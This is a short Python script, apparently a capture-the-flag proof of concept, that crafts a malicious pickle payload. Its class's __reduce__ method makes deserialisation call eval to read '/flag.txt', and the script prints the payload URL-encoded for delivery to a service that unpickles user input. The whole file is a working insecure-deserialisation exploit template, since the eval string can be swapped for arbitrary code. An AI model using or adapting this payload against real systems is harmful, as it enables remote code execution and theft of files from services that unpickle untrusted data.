import os
import marshal
import base64
import _pickle as cPickle
import urllib

class genpoc(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()",))

e = genpoc()
poc = cPickle.dumps(e)

print (urllib.parse.quote(poc))